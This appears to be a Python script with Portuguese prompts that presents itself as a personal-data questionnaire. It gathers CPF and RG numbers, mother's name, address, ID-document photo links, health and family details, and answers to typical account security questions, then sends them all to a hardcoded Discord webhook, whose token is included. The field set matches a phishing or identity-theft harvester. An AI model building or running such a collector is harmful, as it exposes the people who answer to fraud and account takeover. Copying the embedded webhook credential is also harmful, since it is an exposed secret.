import requests
import json
import os
from datetime import datetime

# CONFIGURAÇÃO - COLE SEU WEBHOOK AQUI
WEBHOOK_URL = "https://discord.com/api/webhooks/1424954664687894580/JcxKPVL-DfcXfAE4gMpua1MwuBpcQSF75Pwp8PZEQA3mNUzzRyrIDLc7MbJjUS0FaLmD"

class ColetaDados:
    def __init__(self, webhook_url):
        self.webhook_url = webhook_url
        self.dados = {}
        self.id_sessao = datetime.now().strftime("%Y%m%d_%H%M%S")
    
    def fazer_pergunta(self, pergunta, obrigatoria=False):
        """Faz uma pergunta e coleta a resposta do usuário"""
        while True:
            resposta = input(f"\n📝 {pergunta}: ").strip()
            
            if obrigatoria and not resposta:
                print("❌ Esta pergunta é obrigatória!")
                continue
                
            return resposta
    
    def enviar_discord(self, titulo, conteudo):
        """Envia dados para o Discord"""
        try:
            embed = {
                "title": f"📋 {titulo}",
                "description": f"```json\n{conteudo}\n```",
                "color": 0xff0000,
                "timestamp": datetime.utcnow().isoformat(),
                "footer": {"text": f"Sessão: {self.id_sessao}"}
            }
            
            payload = {
                "embeds": [embed],
                "username": "Coletor de Dados",
                "avatar_url": "https://cdn-icons-png.flaticon.com/512/2911/2911812.png"
            }
            
            requests.post(self.webhook_url, json=payload)
            return True
        except:
            return False
    
    def coletar_dados_pessoais(self):
        """Coleta dados pessoais básicos - USUÁRIO PREENCHE"""
        print("\n" + "="*50)
        print("👤 DADOS PESSOAIS")
        print("="*50)
        
        self.dados['pessoal'] = {
            'nome_completo': self.fazer_pergunta("Nome completo", obrigatoria=True),
            'apelido': self.fazer_pergunta("Apelido ou como gosta de ser chamado"),
            'data_nascimento': self.fazer_pergunta("Data de nascimento (DD/MM/AAAA)"),
            'idade': self.fazer_pergunta("Idade"),
            'cpf': self.fazer_pergunta("CPF"),
            'rg': self.fazer_pergunta("RG"),
            'nome_mae': self.fazer_pergunta("Nome da mãe"),
            'cidade_nascimento': self.fazer_pergunta("Cidade onde nasceu"),
            'estado_civil': self.fazer_pergunta("Estado civil (solteiro, casado, etc)"),
            'genero': self.fazer_pergunta("Gênero")
        }
    
    def coletar_contato(self):
        """Coleta informações de contato - USUÁRIO PREENCHE"""
        print("\n" + "="*50)
        print("📞 CONTATOS")
        print("="*50)
        
        self.dados['contato'] = {
            'telefone': self.fazer_pergunta("Telefone principal com DDD"),
            'whatsapp': self.fazer_pergunta("Número do WhatsApp"),
            'email': self.fazer_pergunta("Email principal"),
            'email_alternativo': self.fazer_pergunta("Email alternativo"),
            'telefone_recado': self.fazer_pergunta("Telefone para recados")
        }
    
    def coletar_endereco(self):
        """Coleta endereço - USUÁRIO PREENCHE"""
        print("\n" + "="*50)
        print("🏠 ENDEREÇO")
        print("="*50)
        
        self.dados['endereco'] = {
            'cep': self.fazer_pergunta("CEP"),
            'rua': self.fazer_pergunta("Rua/Avenida"),
            'numero': self.fazer_pergunta("Número"),
            'complemento': self.fazer_pergunta("Complemento (apto, casa, etc)"),
            'bairro': self.fazer_pergunta("Bairro"),
            'cidade': self.fazer_pergunta("Cidade"),
            'estado': self.fazer_pergunta("Estado (SP, RJ, etc)"),
            'pais': self.fazer_pergunta("País")
        }
    
    def coletar_redes_sociais(self):
        """Coleta redes sociais - USUÁRIO PREENCHE"""
        print("\n" + "="*50)
        print("🌐 REDES SOCIAIS")
        print("="*50)
        
        self.dados['redes_sociais'] = {
            'facebook': self.fazer_pergunta("Link do Facebook ou nome de usuário"),
            'instagram': self.fazer_pergunta("Instagram (@usuário)"),
            'twitter': self.fazer_pergunta("Twitter (@usuário)"),
            'tiktok': self.fazer_pergunta("TikTok (@usuário)"),
            'linkedin': self.fazer_pergunta("LinkedIn (link ou nome)"),
            'youtube': self.fazer_pergunta("Canal do YouTube"),
            'discord': self.fazer_pergunta("Discord (usuário#1234)"),
            'telegram': self.fazer_pergunta("Telegram (@usuário)"),
            'outras_redes': self.fazer_pergunta("Outras redes sociais que usa")
        }
    
    def coletar_trabalho(self):
        """Coleta dados profissionais - USUÁRIO PREENCHE"""
        print("\n" + "="*50)
        print("💼 TRABALHO E PROFISSÃO")
        print("="*50)
        
        self.dados['trabalho'] = {
            'profissao': self.fazer_pergunta("Sua profissão"),
            'empresa': self.fazer_pergunta("Onde trabalha atualmente"),
            'cargo': self.fazer_pergunta("Seu cargo/função"),
            'tempo_empresa': self.fazer_pergunta("Quanto tempo trabalha lá"),
            'salario': self.fazer_pergunta("Faixa salarial aproximada"),
            'escolaridade': self.fazer_pergunta("Nível de escolaridade"),
            'faculdade': self.fazer_pergunta("Faculdade/curso que fez"),
            'ano_formacao': self.fazer_pergunta("Ano de formação")
        }
    
    def coletar_documentos(self):
        """Solicita links de documentos - USUÁRIO PREENCHE"""
        print("\n" + "="*50)
        print("📷 DOCUMENTOS E FOTOS")
        print("="*50)
        
        self.dados['documentos'] = {
            'foto_perfil': self.fazer_pergunta("Link da sua foto de perfil favorita"),
            'foto_documento': self.fazer_pergunta("Link de foto do seu RG ou CNH (se quiser compartilhar)"),
            'outras_fotos': self.fazer_pergunta("Links de outras fotos importantes para você")
        }
    
    def coletar_gostos(self):
        """Coleta gostos pessoais - USUÁRIO PREENCHE"""
        print("\n" + "="*50)
        print("🎮 GOSTOS E INTERESSES")
        print("="*50)
        
        self.dados['gostos'] = {
            'hobbies': self.fazer_pergunta("Seus hobbies favoritos"),
            'musica': self.fazer_pergunta("Estilos musicais que gosta"),
            'filmes': self.fazer_pergunta("Filmes/séries favoritos"),
            'jogos': self.fazer_pergunta("Jogos favoritos"),
            'esportes': self.fazer_pergunta("Esportes que pratica ou gosta"),
            'comida': self.fazer_pergunta("Comidas favoritas"),
            'livros': self.fazer_pergunta("Livros favoritos"),
            'sonhos': self.fazer_pergunta("Sonhos e objetivos de vida")
        }
    
    def coletar_familia(self):
        """Coleta dados da família - USUÁRIO PREENCHE"""
        print("\n" + "="*50)
        print("👨‍👩‍👧‍👦 FAMÍLIA")
        print("="*50)
        
        self.dados['familia'] = {
            'estado_familiar': self.fazer_pergunta("Com quem você mora atualmente"),
            'pais': self.fazer_pergunta("Nomes dos seus pais"),
            'irmaos': self.fazer_pergunta("Tem irmãos? Quantos e idades"),
            'filhos': self.fazer_pergunta("Tem filhos? Nomes e idades"),
            'conjuge': self.fazer_pergunta("Tem namorado(a)/marido/esposa? Nome"),
            'animal_estimacao': self.fazer_pergunta("Tem animal de estimação? Qual")
        }
    
    def coletar_saude(self):
        """Coleta dados de saúde - USUÁRIO PREENCHE"""
        print("\n" + "="*50)
        print("🏥 SAÚDE")
        print("="*50)
        
        self.dados['saude'] = {
            'altura': self.fazer_pergunta("Sua altura"),
            'peso': self.fazer_pergunta("Seu peso aproximado"),
            'tipo_sanguineo': self.fazer_pergunta("Seu tipo sanguíneo (se souber)"),
            'alergias': self.fazer_pergunta("Tem alguma alergia? Quais"),
            'doencas': self.fazer_pergunta("Tem doenças ou condições médicas"),
            'medicamentos': self.fazer_pergunta("Toma algum medicamento regularmente"),
            'plano_saude': self.fazer_pergunta("Tem plano de saúde? Qual")
        }
    
    def coletar_seguranca(self):
        """Coleta perguntas de segurança - USUÁRIO PREENCHE"""
        print("\n" + "="*50)
        print("🔐 PERGUNTAS DE SEGURANÇA")
        print("="*50)
        
        print("💡 Essas são perguntas comuns de segurança de contas:")
        self.dados['seguranca'] = {
            'nome_avo': self.fazer_pergunta("Nome da sua avó materna"),
            'primeira_escola': self.fazer_pergunta("Nome da sua primeira escola"),
            'nome_primeiro_pet': self.fazer_pergunta("Nome do seu primeiro animal de estimação"),
            'cidade_sonho': self.fazer_pergunta("Cidade que mais sonha em visitar"),
            'comida_odio': self.fazer_pergunta("Comida que mais odeia"),
            'personagem_favorito': self.fazer_pergunta("Personagem de filme/livro favorito")
        }
    
    def executar_questionario(self):
        """Executa todo o questionário - USUÁRIO RESPONDE TUDO"""
        print("🎯 QUESTIONÁRIO DE DADOS PESSOAIS")
        print("💬 Por favor, responda todas as perguntas abaixo:\n")
        
        # Lista de todas as funções de coleta
        questionarios = [
            self.coletar_dados_pessoais,
            self.coletar_contato,
            self.coletar_endereco,
            self.coletar_redes_sociais,
            self.coletar_trabalho,
            self.coletar_documentos,
            self.coletar_gostos,
            self.coletar_familia,
            self.coletar_saude,
            self.coletar_seguranca
        ]
        
        # Executa cada questionário
        for questionario in questionarios:
            try:
                questionario()
                print("✅ Seção completada!\n")
            except KeyboardInterrupt:
                print("\n❌ Questionário interrompido!")
                return False
        
        return True
    
    def enviar_todos_dados(self):
        """Envia todos os dados coletados para o Discord"""
        print("\n📤 Enviando dados para análise...")
        
        # Envia cada categoria separadamente
        for categoria, dados in self.dados.items():
            if dados:  # Só envia se tiver dados
                dados_json = json.dumps(dados, indent=2, ensure_ascii=False)
                self.enviar_discord(f"DADOS - {categoria.upper()}", dados_json)
                print(f"✅ {categoria} enviada!")
        
        # Resumo final
        total_perguntas = sum(len(secao) for secao in self.dados.values())
        resumo = f"""
📊 RESUMO DA COLETA:
👤 Sessão: {self.id_sessao}
📅 Data: {datetime.now().strftime('%d/%m/%Y %H:%M')}
📋 Categorias: {len(self.dados)}
❓ Perguntas respondidas: {total_perguntas}

🎯 Dados coletados com sucesso!
        """
        
        self.enviar_discord("RELATÓRIO FINAL", resumo)
        print("🎉 Todos os dados foram enviados!")

def main():
    # Verifica webhook
    if WEBHOOK_URL == "https://discord.com/api/webhooks/SEU_WEBHOOK_AQUI":
        print("❌ Configure o WEBHOOK_URL no código!")
        return
    
    print("Iniciando coleta de dados...")
    coletor = ColetaDados(WEBHOOK_URL)
    
    # Executa questionário
    if coletor.executar_questionario():
        # Pergunta se quer enviar
        enviar = input("\n📤 Deseja enviar todos os dados? (s/n): ").lower()
        if enviar == 's':
            coletor.enviar_todos_dados()
        else:
            print("📝 Dados mantidos localmente.")
        
        # Salva backup
        with open(f"dados_{coletor.id_sessao}.json", "w") as f:
            json.dump(coletor.dados, f, indent=2)
        print(f"💾 Backup salvo: dados_{coletor.id_sessao}.json")

if __name__ == "__main__":
    main()
